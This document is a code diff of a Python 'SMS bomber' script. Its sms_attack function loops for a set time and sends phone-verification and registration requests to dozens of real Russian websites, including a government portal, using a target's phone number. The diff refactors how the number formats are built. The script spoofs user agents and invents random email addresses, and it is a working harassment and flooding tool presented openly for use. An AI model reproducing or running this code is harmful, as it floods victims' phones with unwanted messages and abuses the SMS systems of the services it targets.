@@ -17,6 +17,7 @@ import requests
 import time
 import json
 import random
+import string
 from threading import Thread
 from fake_useragent import UserAgent
 
@@ -40,8 +41,29 @@ def sms_attack(number, time_a):
     while time.monotonic() - t < time_a:
         user = ua.random
 
+        #number variables
+        num1 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
+        num269 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"
+        num3 = f"+7 ({number[1:4]}) {number[4:7]} - {number[7:9]} - {number[9:]}"
+        num4 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
+        num5 = "+7 ({0}{1}{2}) {3}{4}{5} {6}{7}{8}{9}".format(*number)
+        num6 = '+7 ({0}) {1}-{2}-{3}'.format(number[1:4], number[4:7], number[7:9], number[9:11])
+        num7 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"
+        num8 = "+7({}{}{}){}{}{}{}".format(number[1], number[2], number[3], number[4], number[5], number[6],number[7] + number[8] + number[9] + number[10])
+        num9 = "+7 {} {} {} {} {}{}".format(number[1:4], number[4:7], number[7:9], number[9:11])
+        num10 = f"+7({number[1:4]}){number[4:7]}-{number[7:]}"
+        num11 = f"+7 {num[1:4]} {num[4:7]}-{num[7:9]}-{num[9:11]}"
+        num21, num22, num23, num24 = number[1:4], number[4:7], number[7:9], number[9:11]
+
+        #email generator
+        lib = string.ascii_lowercase + string.digits
+        lib2 = ['@gmail.com', '@hotmail.com', '@yahoo.com', '@yandex.ru']
+        email = ''.join(random.choice(lib) for i in range(random.randint(8, 27))) + random.choice(lib2)
+
+
+
+        #requests
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
             header = {
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -61,12 +83,10 @@ def sms_attack(number, time_a):
                 'X-Requested-With': 'XMLHttpRequest'
             }
 
-            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num2}&_=1667424921408', headers=header)
+            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num1}&_=1667424921408', headers=header)
         except:
             pass
         try:
-            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -89,7 +109,7 @@ def sms_attack(number, time_a):
                 'x-wtf-id': '1724712-1667427470.069-178.170.198.53-56020'
             }
 
-            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num2,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}
+            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num269,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}
 
             requests.post('https://spb.profi.ru/graphql', json=payload, headers=header)
         except:
@@ -277,9 +297,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7 ({number[1:4]}) {number[4:7]} - {number[7:9]} - {number[9:]}"
-
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-encoding': 'gzip, deflate, br',
@@ -302,7 +319,7 @@ def sms_attack(number, time_a):
             payload = {
                 'wct_reg_fio': 'Кондратьев',
                 'wct_reg_fio2': 'Василий',
-                'wct_reg_phone': num2,
+                'wct_reg_phone': num3,
                 'wct_reg_ch': 'Y',
                 'wct_reg_1': '',
                 'wct_reg_2': '',
@@ -319,8 +336,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -340,14 +355,12 @@ def sms_attack(number, time_a):
                 'User-Agent': user
             }
 
-            payload = {"analyticalData":{"cookie":{"new_site":"old","_ga":"GA1.2.2803055798.1667505193","_ym_uid":"1667505193311447307","default_city":"msk","gfab_ninja":"ninja","gfab_ssr_vs_spa":"spa","gfab_ssr_vs_spa2":"spa","gfab_ssr_vs_spa3":"spa","gfab_popup_test":"empty","gfab_drinks_price":"empty","gfab_newgf_new_unauthorized":"empty","gfab_for-suppliers":"enable-for-suppliers","last_ga_session_loading_number":"0","owox_session_id":"2803055798.1667505193_1667505197845","city_confirmed":"true","selected_target":"p2","_efst":"945447c2f000a249a96b6e6b10f462844f3b06628854b34613dea1c11eb93041"}},"client":{"phone":num2,"recaptchaToken":None,"cityId":2},"brandId_H":"lY"}
+            payload = {"analyticalData":{"cookie":{"new_site":"old","_ga":"GA1.2.2803055798.1667505193","_ym_uid":"1667505193311447307","default_city":"msk","gfab_ninja":"ninja","gfab_ssr_vs_spa":"spa","gfab_ssr_vs_spa2":"spa","gfab_ssr_vs_spa3":"spa","gfab_popup_test":"empty","gfab_drinks_price":"empty","gfab_newgf_new_unauthorized":"empty","gfab_for-suppliers":"enable-for-suppliers","last_ga_session_loading_number":"0","owox_session_id":"2803055798.1667505193_1667505197845","city_confirmed":"true","selected_target":"p2","_efst":"945447c2f000a249a96b6e6b10f462844f3b06628854b34613dea1c11eb93041"}},"client":{"phone":num4,"recaptchaToken":None,"cityId":2},"brandId_H":"lY"}
 
             requests.post('https://admin.growfood.pro/api/personal-cabinet/v1/authentication/send-sms', json=payload, headers=header)
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -389,7 +402,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                "phoneNumber": num2,
+                "phoneNumber": num4,
                 "captcha": ""
             }
 
@@ -399,8 +412,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -422,7 +433,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'captchaCode': '',
                 'captchaWord': '',
                 'sessid': '79eb9fa06a250d301c9cdc119acc4a2e'
@@ -434,8 +445,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5} {6}{7}{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -455,7 +464,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'phoneNumber': num2,
+                'phoneNumber': num5,
                 'lang': 'ru',
                 'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                 'source': 'showScreenSet',
@@ -470,8 +479,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -494,7 +501,7 @@ def sms_attack(number, time_a):
                 'x-wtf-id': '1724716-1667523497.326-92.204.175.94-21808'
             }
 
-            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num2,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}
+            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num269,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}
 
             requests.post('https://profi.ru/graphql', json=payload, headers=header)
         except:
@@ -525,8 +532,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = '+7 ({0}) {1}-{2}-{3}'.format(number[1:4], number[4:7], number[7:9], number[9:11])
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -550,7 +555,7 @@ def sms_attack(number, time_a):
                 "confirm": "on",
                 "email": "hrufmdo_23@hotmail.com",
                 "password": "Hoho_HO123",
-                'phone': num2
+                'phone': num6
             }
 
             requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header)
@@ -582,8 +587,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -634,7 +637,7 @@ def sms_attack(number, time_a):
                 "name": "Вася",
                 "password": "Hoho_HO123",
                 "password_repeat": "Hoho_HO123",
-                "phone": num2,
+                "phone": num7,
                 "sex": "male",
                 "token": token
             }
@@ -777,8 +780,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -799,7 +800,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'checkWord': '2QI6HY}h%YHc9Mxa6QOmC8htR5',
                 'repeat': '0',
                 'SITE_ID': 's1',
@@ -913,20 +914,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7({}{}{}){}{}{}{}".format(number[1], number[2], number[3], number[4], number[5], number[6], number[7]+number[8]+number[9]+number[10])
-
-            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
-            lib2 = [
-                '@gmail.com',
-                '@hotmail.com',
-                '@yahoo.com',
-                '@yandex.ru'
-            ]
-            email = ''
-            for i in range(random.randint(8, 27)):
-                email += random.choice(lib)
-            email += random.choice(lib2)
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -954,25 +941,13 @@ def sms_attack(number, time_a):
                 'email': email,
                 'first_name': 'Потанин',
                 'last_name': 'Василий',
-                'phone': num2
+                'phone': num8
             }
 
             requests.post('https://esia.gosuslugi.ru/registration_api/user-data', json=payload, headers=header)
         except:
             pass
         try:
-            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
-            lib2 = [
-                '@gmail.com',
-                '@hotmail.com',
-                '@yahoo.com',
-                '@yandex.ru'
-            ]
-            email = ''
-            for i in range(random.randint(8, 27)):
-                email += random.choice(lib)
-            email += random.choice(lib2)
-
             header = {
                 'accept': 'application/json, text/plain, */*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -997,12 +972,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num = number
-            num2 = num[1] + num[2] + num[3]
-            num3 = num[4] + num[5] + num[6]
-            num4 = num[7] + num[8]
-            num5 = num[9] + num[10]
-
             header = {
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -1021,12 +990,11 @@ def sms_attack(number, time_a):
                 'X-Requested-With': 'XMLHttpRequest'
             }
 
-            requests.get(f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num2}%20{num3}%20{num4}%20{num5}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
+            requests.get(f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num21}%20{num22}%20{num23}%20{num24}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
                 headers=header)
         except:
             pass
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
 
             header = {
                 'accept': 'application/json, text/plain, */*',
@@ -1045,14 +1013,12 @@ def sms_attack(number, time_a):
                 'User-Agent': user
             }
 
-            payload = {'dest': num2}
+            payload = {'dest': num1}
 
             requests.post('https://admin.foodzo.ru/api/v2/users/send-code/phone', json=payload, headers=header)
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -1076,7 +1042,7 @@ def sms_attack(number, time_a):
                 'AUTH_FORM': 'Y',
                 'TYPE': 'AUTH',
                 'FORM[AUTH_TYPE]': 'PHONE',
-                'FORM[PHONE]': num2
+                'FORM[PHONE]': num4
             }
 
             requests.post('https://online.globus.ru/', data=payload, headers=header)
@@ -1177,8 +1143,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 {} {} {} {} {}{}".format(num[1:4], num[4:7], num[7:9], num[9:11])
-
             header = {
                 'accept': 'application/json, text/plain, */*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -1199,7 +1163,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'phone': num2,
+                'phone': num9,
                 "g-recaptcha-response": {}
             }
 
@@ -1233,8 +1197,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -1256,7 +1218,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'captchaCode': '',
                 'captchaWord': '',
                 'sessid': 'e13afe9718f81a6518cbaa0bda8979e3'
@@ -1457,8 +1419,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -1482,7 +1442,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'phone': num2
+                'phone': num4
             }
 
             requests.post('https://oauth.av.ru/check-phone', json=payload, headers=header )
@@ -1601,8 +1561,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -1626,7 +1584,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'phone': num2,
+                'phone': num4,
                 'u': "U"
             }
 
@@ -1686,14 +1644,12 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:]}"
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-language': 'fr-FR,fr',
                 'content-length': '38',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num2}',
+                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num10}',
                 'origin': 'https://airsoft-rus.ru',
                 'referer': 'https://airsoft-rus.ru/',
                 'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
@@ -1707,7 +1663,7 @@ def sms_attack(number, time_a):
             }
 
             payload = {
-                'phone': '+'+num2,
+                'phone': '+'+num10,
                 'register': True
             }
 
@@ -1745,8 +1701,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-encoding': 'gzip, deflate, br',
@@ -1769,7 +1723,7 @@ def sms_attack(number, time_a):
             payload = {
                 'FUSER_ID': '235877642',
                 'USER_NAME': '',
-                'USER_PHONE': num2,
+                'USER_PHONE': num4,
                 'token': '',
                 'is_retry': ''
             }
@@ -1829,8 +1783,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -1854,7 +1806,7 @@ def sms_attack(number, time_a):
 
             payload = {
                 'action': 'code_sms',
-                'PERSONAL_PHONE': num2,
+                'PERSONAL_PHONE': num4,
                 'PERSONAL_EMAIL': ''
             }
 
@@ -1917,8 +1869,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -1943,7 +1893,7 @@ def sms_attack(number, time_a):
             payload = {
                 'step': '1',
                 'pets': '',
-                'phone': num2,
+                'phone': num4,
                 'token': '',
                 'lastName': '',
                 'firstName': '',
@@ -2071,25 +2021,6 @@ def sms_attack(number, time_a):
         except:
             pass
         try:
-            num = number
